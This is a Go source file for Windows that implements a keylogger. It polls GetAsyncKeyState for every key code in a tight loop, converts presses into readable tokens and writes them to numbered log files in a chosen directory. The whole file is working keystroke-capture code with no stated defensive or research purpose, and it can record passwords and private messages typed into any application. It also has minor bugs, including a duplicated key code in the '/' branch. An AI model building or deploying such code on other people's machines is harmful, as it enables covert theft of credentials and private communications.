/*
windows only
*/
package main

import(
	"fmt"
	"syscall"
	"flag"
	"time"
	"os"
	"log"
	"strconv"
	"strings"
)

var(
	dll, _ = syscall.LoadDLL("user32.dll")
	proc, _ = dll.FindProc("GetAsyncKeyState")
	interval = flag.Int("interval", 16, "a time value elapses each frame in millisecond")
	directory = flag.String("directory", "", "path/to/dir to save key log")
)

func isExist(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

func main() {
	defer dll.Release()
	flag.Parse()

	dir := strings.Replace(*directory, "\\", "/", -1)
	if ! strings.HasSuffix(dir, "/") {
		if dir == "" {
			dir = "./"
		} else {
			dir += "/"
		}
	}

	// create directory if not exist
	if ! isExist(dir) {
		err := os.MkdirAll(dir, 0777)
		if err != nil {
			log.Fatal("cannot create directory")
		}
	}

	// search cuurent log number
	var number int
	for number = 0; isExist(dir + strconv.Itoa(number) + ".log"); number++ {}

	// set output log file
	fp, err := os.OpenFile(dir + strconv.Itoa(number) + ".log", os.O_WRONLY | os.O_CREATE, 0777)
	if err != nil {
		log.Fatal("error opening file :", err.Error())
	}
	defer fp.Close()
	log.SetOutput(fp)

	var start, end time.Time
	inputs := make([]int, 256)
	prev := make([]int, 256)

	// logging
	for {
		start = time.Now()
		// get current input
		for i := 1; i < 256; i++ {
			a, _, _ := proc.Call(uintptr(i))
			if a & 0x8000 == 0 {
				continue
			}
			// num lock
			if i == 0xf4 || i == 0xf3 {
				continue
			}
			// mouse
			if i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06 {
				continue
			}
			// shift
			if i == 0x10 {
				continue
			}
			inputs[i] = 1
		}

		s := ""
		for i := 1; i < 256; i++ {
			if inputs[i] == 0 {
				if i == 0x11 && prev[i] == 1 {
					s += "ctrl off "
				}
				if i == 0x12 && prev[i] == 1 {
					s += "alt off "
				}
				if i == 0xa0 && prev[i] == 1 {
					s += "lshift off "
				}
				if i == 0xa1 && prev[i] == 1 {
					s += "rshift off "
				}
				continue
			}

			if prev[i] == 1 {
				continue
			}

			// character
			if 'A' <= i && i <= 'Z' {
				s += fmt.Sprintf("%c ", i)
				continue
			}

			// number
			if '0' <= i && i <= '9' {
				s += fmt.Sprintf("%d", i - 0x30)
				continue
			}

			// back space
			if i == 0x08 {
				s += "back space "
				continue
			}

			// tab
			if i == 0x09 {
				s += "tab "
				continue
			}

			// enter
			if i == 0x0d {
				s += "enter "
				continue
			}

			// ctrl
			if i == 0x11 {
				s += "ctrl on "
				continue
			}

			// alt
			if i == 0x12 {
				s += "alt on "
				continue
			}

			// space
			if i == 0x20 {
				s += "space "
				continue
			}

			// left
			if i == 0x25 {
				s += "left "
				continue
			}

			// up
			if i == 0x26 {
				s += "up "
				continue
			}

			// right
			if i == 0x27 {
				s += "right "
				continue
			}

			// down
			if i == 0x28 {
				s += "down "
				continue
			}

			// *
			if i == 0x6a {
				s += "* "
				continue
			}

			// +
			if i == 0x6b {
				s += "+ "
				continue
			}

			// -
			if i == 0x6d {
				s += "- "
				continue
			}

			// .
			if i == 0x6e {
				s += ". "
				continue
			}

			// /
			if i == 0x6e {
				s += "/ "
				continue
			}

			// shift
			if i == 0xa0 {
				s += "lshift on "
				continue
			}
			if i == 0xa1 {
				s += "rshift on "
				continue
			}

			// :
			if i == 0xba {
				s += ": "
				continue
			}

			// ;
			if i == 0xbb {
				s += "; "
				continue
			}

			// ,
			if i == 0xbc {
				s += ", "
				continue
			}

			// -
			if i == 0xbd {
				s += "- "
				continue
			}

			// .
			if i == 0xbe {
				s += ". "
				continue
			}

			// /
			if i == 0xbf {
				s += "/ "
				continue
			}

			// @
			if i == 0xc0 {
				s += "@ "
				continue
			}

			// [
			if i == 0xdb {
				s += "[ "
				continue
			}

			// \
			if i == 0xdc {
				s += "| "
				continue
			}

			// ]
			if i == 0xdd {
				s += "] "
				continue
			}

			// ^
			if i == 0xde {
				s += "^ "
				continue
			}

			// \
			if i == 0xe2 {
				s += "back slash "
				continue
			}

			s += fmt.Sprintf("%02x ", i)
		}

		if s != "" {
			log.Printf(s)
		}

		// clear
		prev = inputs
		inputs = make([]int, 256)
		end = time.Now()
		time.Sleep((time.Millisecond * (time.Duration)(*interval)) - end.Sub(start))
	}
}
